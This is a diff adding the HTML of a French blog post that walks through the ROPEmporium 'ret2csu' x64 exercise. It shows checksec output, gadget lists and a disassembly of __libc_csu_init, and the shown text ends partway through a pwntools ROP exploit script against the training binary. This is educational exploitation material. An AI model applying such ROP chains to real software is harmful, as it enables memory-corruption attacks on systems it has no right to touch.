@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:conflict]">
+<meta name="description" content="Dernier exercice de ropemporium.com" />
+<meta name="keywords" content="cybersecurity blog french hacking rami malek, pwn, rop, ret2csu" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/posts/2023/03/ropemporium-ret2csu-x64/" />
+
+
+    <title>
+        
+            🇫🇷 ROPEmporium - ret2csu (x64) :: conflict  — cybersecurity blog
+        
+    </title>
+
+
+
+
+
+  <link rel="stylesheet" href="/main.min.244183cde1a38e0b08f82c11791181288f9aac1cc9618cd6f4e9e7710c5768ba.css" integrity="sha256-JEGDzeGjjgsI&#43;CwReRGBKI&#43;arBzJYYzW9OnncQxXaLo=" crossorigin="anonymous">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="🇫🇷 ROPEmporium - ret2csu (x64)">
+  <meta itemprop="description" content="Dernier exercice de ropemporium.com">
+  <meta itemprop="datePublished" content="2023-03-12T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2023-03-12T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1813">
+  <meta itemprop="image" content="/">
+  <meta itemprop="keywords" content="Pwn,Rop,Ret2csu">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="/">
+  <meta name="twitter:title" content="🇫🇷 ROPEmporium - ret2csu (x64)">
+  <meta name="twitter:description" content="Dernier exercice de ropemporium.com">
+
+
+
+    <meta property="og:url" content="/posts/2023/03/ropemporium-ret2csu-x64/">
+  <meta property="og:site_name" content="conflict">
+  <meta property="og:title" content="🇫🇷 ROPEmporium - ret2csu (x64)">
+  <meta property="og:description" content="Dernier exercice de ropemporium.com">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-03-12T00:00:00+00:00">
+    <meta property="article:modified_time" content="2023-03-12T00:00:00+00:00">
+    <meta property="article:tag" content="Pwn">
+    <meta property="article:tag" content="Rop">
+    <meta property="article:tag" content="Ret2csu">
+    <meta property="og:image" content="/">
+      <meta property="og:see_also" content="/posts/2023/01/ropemporium-badchars-x64/">
+      <meta property="og:see_also" content="/posts/2023/01/ropemporium-write4-x64/">
+      <meta property="og:see_also" content="/posts/2023/01/ropemporium-callme-x64/">
+      <meta property="og:see_also" content="/posts/2023/01/ropemporium-split-x64/">
+      <meta property="og:see_also" content="/posts/2022/12/ropemporium-ret2win-x64/">
+
+
+
+
+
+
+    <meta property="article:published_time" content="2023-03-12 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">-</span>
+            <span class="logo__text ">
+                cnf409</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#527ea9;
+                   animation-duration:0.8s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/contact/">Contact</a></li><li><a href="/htb/">HackTheBox</a></li><li><a href="/posts/">Posts</a></li><li><a href="/series/">Series</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        9 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="/posts/2023/03/ropemporium-ret2csu-x64/">🇫🇷 ROPEmporium - ret2csu (x64)</a>
+      </h1>
+
+      
+        <div class="post-excerpt">Dernier exercice de ropemporium.com</div>
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <h2 id="note">Note</h2>
+<p>Dernier exercice de ROPEmporium, j&rsquo;ai effectivement sauté <em>fluff</em> et <em>pivot</em> puisque je voulais apprendre cette technique car je l&rsquo;ai rencontrée lors d&rsquo;un CTF. Je reviendrai peut-être sur <em>pivot</em> mais je ne pense pas faire <em>fluff</em> puisqu&rsquo;il est bien trop <strong>chiant</strong>.</p>
+<p>Je vais essayer d&rsquo;expliquer au mieux ce que j&rsquo;ai compris du <strong>ret2csu</strong>.</p>
+<p>Comme d&rsquo;habitude, si j&rsquo;ai fait des erreurs, n&rsquo;hésitez pas à me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a> pour me le dire.</p>
+<p>Si vous ne comprenez pas quelque chose, je vous invite à <a href="/series/ropemporium-x64-series/">regarder la série dans l&rsquo;ordre</a>.</p>
+<p>Et cet exercice reprend le principe de <em>callme</em>, donc si vous n&rsquo;avez pas lu mon writeup sur ce dernier je vous conseille d&rsquo;y jeter un oeil.</p>
+<h2 id="description">Description</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Same same, but different
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>This challenge is very similar to &#34;callme&#34;, with the exception of the useful gadgets. Simply call the `ret2win()` function in the accompanying library with same arguments that you used to beat the &#34;callme&#34; challenge (`ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d)` for the ARM &amp; MIPS binaries, `ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)` for the x86_64 binary.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Populating the elusive 3rd register using ROP can prove more difficult than you might expect, especially in smaller binaries with fewer gadgets. This can become particularly irksome since many useful GLIBC functions require three arguments.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>So little room for activities
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Start by using ropper to search for sensible gadgets, if there&#39;s no `pop rdx` for example, perhaps there&#39;s a `mov rdx, rbp` that you could chain with a `pop rbp`. If you&#39;re all out of ideas go ahead and read the last paragraph.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Universal
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Fortunately some very smart people have come up with a solution to your problem and as is customary in infosec given it a collection of pretentious names, including &#34;Universal ROP&#34;, &#34;μROP&#34;, &#34;return-to-csu&#34; or just &#34;ret2csu&#34;. You can learn all you need to on the subject from this [BlackHat Asia paper](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf). Note that more recent versions of gcc may use different registers from the example in `__libc_csu_init()`, including the version that compiled this challenge.
+</span></span></code></pre></div><h2 id="file-information">File information</h2>
+<p>Avant de commencer à regarder l&rsquo;executable, il faut savoir à quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les éventuelles sécuritées avec lesquelles il a été compilé</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">file</span> <span style="color:#f92672">ret2csu</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">ret2csu</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">f722121b08628ec9fc4a8cf5abd1071766097362</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
+</span></span></code></pre></div><p>On va donc s&rsquo;attaquer à un executable en <strong>64bit</strong>, qui n&rsquo;est <strong>pas strippé</strong></p>
+<p>Maintenant le <code>checksec</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">ret2csu</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ropemporium/ret2csu_x64/ret2csu&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RUNPATH</span><span style="color:#f92672">:</span>  <span style="color:#e6db74">&#39;.&#39;</span>
+</span></span></code></pre></div><p>Comme pour les autres exercices <strong>NX</strong> est activé donc pas de shellcode, mais ce n&rsquo;est pas un problème puisque la description de l&rsquo;exercice nous indique exactement quoi faire.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Pour rappel, le but de cet exercice est d&rsquo;appeller la fonction <code>ret2win()</code> avec en paramètres <code>0xdeadbeefdeadbeef</code>, <code>0xcafebabecafebabe</code> et <code>0xd00df00dd00df00d</code>.</p>
+<p>Même si ça paraît simple, on va vite se rendre compte que certains gadgets manquent&hellip;</p>
+<p>Commençons par essayer de trouver des quoi modifier les trois registres nécessaires: <code>rdi</code>, <code>rsi</code> et <code>rdx</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069c</span> : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069e</span> : pop r13 ; pop r14 ; pop r15 ; ret
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a0</span> : pop r14 ; pop r15 ; ret
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a2</span> : pop r15 ; ret
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400604</span> : pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040057b</span> : pop rbp ; mov edi, <span style="color:#ae81ff">0x601038</span> ; jmp rax
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069b</span> : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069f</span> : pop rbp ; pop r14 ; pop r15 ; ret
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400588</span> : pop rbp ; ret
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a3</span> : pop rdi ; ret
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a1</span> : pop rsi ; pop r15 ; ret
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040069d</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+</span></span></code></pre></div><p>On voit qu&rsquo;on a un <code>pop rdi</code>, un <code>pop rsi</code> mais pas de <code>pop rdx</code>, donc impossible de modifier la valeur de <code>rdx</code>.</p>
+<p>Voyons voir si un <code>mov</code> pourrait nous aider:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005e2</span> : mov byte ptr [rip <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x200a4f</span>], <span style="color:#ae81ff">1</span> ; pop rbp ; ret
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400610</span> : mov eax, <span style="color:#ae81ff">0</span> ; pop rbp ; ret
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400602</span> : mov ebp, esp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040057c</span> : mov edi, <span style="color:#ae81ff">0x601038</span> ; jmp rax
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400601</span> : mov rbp, rsp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
+</span></span></code></pre></div><p>Non, rien d&rsquo;utile ici&hellip; On va donc devoir effectuer un <code>ret2csu</code> pour pouvoir modifier nos trois registres.</p>
+<p>Dans la plupart des éxecutables <code>ELF</code>, on retrouve une fonction nommée <code>__libc_csu_init</code> (si vous voulez savoir en détail ce qu&rsquo;elle fait, je vous invite à lire <a href="https://stackoverflow.com/questions/61649960/why-do-program-level-constructors-get-called-by-libc-csu-init-but-destructor">ceci</a>). C&rsquo;est cette dernière qui va nous permettre de contrôler (entre autres) <code>rdx</code>.</p>
+<p>On peut la désassembler pour voir un peu à quoi elle ressemble:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>disass __libc_csu_init 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function __libc_csu_init:
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400640</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>:	push   r15
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400642</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;</span>:	push   r14
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400644</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>:	mov    r15,rdx
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400647</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">7</span><span style="color:#f92672">&gt;</span>:	push   r13
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400649</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span>:	push   r12
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040064b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:	lea    r12,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20079e</span>]        <span style="color:#75715e"># 0x600df0</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400652</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">&gt;</span>:	push   rbp
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400653</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">19</span><span style="color:#f92672">&gt;</span>:	lea    rbp,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20079e</span>]        <span style="color:#75715e"># 0x600df8</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040065a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">26</span><span style="color:#f92672">&gt;</span>:	push   rbx
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040065b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">27</span><span style="color:#f92672">&gt;</span>:	mov    r13d,edi
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040065e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">30</span><span style="color:#f92672">&gt;</span>:	mov    r14,rsi
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400661</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:	sub    rbp,r12
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400664</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;</span>:	sub    rsp,<span style="color:#ae81ff">0x8</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400668</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">40</span><span style="color:#f92672">&gt;</span>:	sar    rbp,<span style="color:#ae81ff">0x3</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040066c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x4004d0</span> <span style="color:#f92672">&lt;</span>_init<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400671</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">49</span><span style="color:#f92672">&gt;</span>:	test   rbp,rbp
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400674</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">52</span><span style="color:#f92672">&gt;</span>:	je     <span style="color:#ae81ff">0x400696</span> <span style="color:#f92672">&lt;</span>__libc_csu_init<span style="color:#f92672">+</span><span style="color:#ae81ff">86</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400676</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;</span>:	xor    ebx,ebx
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400678</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">56</span><span style="color:#f92672">&gt;</span>:	nop    DWORD PTR [rax<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400680</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:	mov    rdx,r15
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400683</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">67</span><span style="color:#f92672">&gt;</span>:	mov    rsi,r14
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400686</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">70</span><span style="color:#f92672">&gt;</span>:	mov    edi,r13d
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400689</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">73</span><span style="color:#f92672">&gt;</span>:	call   QWORD PTR [r12<span style="color:#f92672">+</span>rbx<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040068d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">77</span><span style="color:#f92672">&gt;</span>:	add    rbx,<span style="color:#ae81ff">0x1</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400691</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">81</span><span style="color:#f92672">&gt;</span>:	cmp    rbp,rbx
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400694</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">84</span><span style="color:#f92672">&gt;</span>:	jne    <span style="color:#ae81ff">0x400680</span> <span style="color:#f92672">&lt;</span>__libc_csu_init<span style="color:#f92672">+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400696</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">86</span><span style="color:#f92672">&gt;</span>:	add    rsp,<span style="color:#ae81ff">0x8</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040069a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">90</span><span style="color:#f92672">&gt;</span>:	pop    rbx
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040069b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">91</span><span style="color:#f92672">&gt;</span>:	pop    rbp
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040069c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">92</span><span style="color:#f92672">&gt;</span>:	pop    r12
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040069e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">94</span><span style="color:#f92672">&gt;</span>:	pop    r13
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006a0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">96</span><span style="color:#f92672">&gt;</span>:	pop    r14
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006a2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">98</span><span style="color:#f92672">&gt;</span>:	pop    r15
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004006a4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">100</span><span style="color:#f92672">&gt;</span>:	ret    
+</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
+</span></span></code></pre></div><p>Comme vous l&rsquo;avez peut-être remarqué, on retrouve une série d&rsquo;instructions <code>pop</code> suivies d&rsquo;un <code>ret</code>, et au dessus, des instructions <code>mov</code> qui placent les valeurs des registres modifiés en dessous dans <code>rdx</code>, <code>rsi</code> et <code>edi</code>.</p>
+<p>Le principe du <code>ret2csu</code> est donc de <em>jump</em> au premier <code>pop rbx</code>, puis une fois à l&rsquo;instruction <code>ret</code>, <em>jump</em> sur le premier <code>mov rdx, r15</code> pour avoir le contrôle sur le contenu du registre <code>rdx</code> ainsi que <code>rsi</code> et <code>edi</code>.</p>
+<p>Vous l&rsquo;avez peut-être remarqué, mais le dernier <code>mov</code> est un <code>mov edi, r13d</code> et non pas un <code>mov rdi, r13</code>, on devra donc re-modifier la valeur de <code>rdi</code> après ceci mais ce n&rsquo;est pas un problème puisque nous avons un <code>pop rdi ; ret</code> pour le faire.</p>
+<p>Commençons notre exploit avec tout d&rsquo;abord le padding et la première partie:</p>
+<blockquote>
+<p>Je n&rsquo;explique pas comment trouver les adresses utilisées puisque je pars du principe que vous avez vu les précédents writeups et que vous savez le faire, si ce n&rsquo;est pas le cas vous pouvez allez voir les premiers exercices</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;ret2csu&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    init <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x600e38</span>
+</span></span><span style="display:flex;"><span>    win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400510</span>
+</span></span><span style="display:flex;"><span>    pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4006a3</span>
+</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4004e6</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    csu_pops <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40069a</span>
+</span></span><span style="display:flex;"><span>    csu_movs <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400680</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> padding <span style="color:#75715e"># Padding de 40 bytes pour commencer à réecrire RIP</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(ret) <span style="color:#75715e"># Patch l&#39;alignement de la stack (Ubuntu)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(csu_pops) <span style="color:#75715e"># Pop rbx, rbp, r12, r13, r14, r15</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00</span>) <span style="color:#75715e"># 0 dans RBX</span>
